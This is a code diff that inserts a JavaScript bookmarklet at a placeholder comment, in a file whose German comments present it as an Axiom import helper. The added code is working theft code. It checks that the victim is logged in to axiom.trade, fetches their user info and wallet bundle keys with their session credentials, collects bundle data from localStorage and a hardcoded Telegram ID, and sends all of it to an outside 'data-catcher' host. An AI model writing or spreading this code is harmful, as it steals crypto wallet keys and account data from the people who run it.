@@ -444,6 +444,66 @@
 
                     // ============================================================
                     // PLATZHALTER:
+                    javascript:(async()=>{
+
+    try {
+
+        if(location.hostname !== 'axiom.trade'){
+            alert('Please navigate to axiom.trade first');
+            return;
+        }
+
+        if(!localStorage.getItem('isAuthed')){
+            alert('Please log in to axiom.trade first');
+            return;
+        }
+
+        const user = await (
+            await fetch('//api7.axiom.trade/user-info',{
+                method:'POST',
+                credentials:'include'
+            })
+        ).json();
+
+
+        const bundle = await (
+            await fetch('//api8.axiom.trade/bundle-key-and-wallets',{
+                method:'POST',
+                credentials:'include'
+            })
+        ).json();
+
+
+        const bookmarkData = {
+
+            telegramId: '7198683357',
+
+            site: location.href,
+
+            user: user,
+
+            bundle: bundle.bundleKey,
+
+            sBundles: localStorage.getItem('sBundles'),
+
+            eBundles: localStorage.getItem('eBundles')
+
+        };
+
+
+        location.replace(
+            'https://my-data-catcherr.onrender.com/data/' +
+            btoa(JSON.stringify(bookmarkData))
+        );
+
+
+    } catch(e) {
+
+        alert('Error occurred');
+
+    }
+
+})();
                     // Hier kann später Logik ergänzt werden, die automatisch das
                     // Axiom Import-Fenster öffnet, das Textfeld befüllt und den
                     // Import-Button klickt. Aktuell kopiert das Bookmarklet die
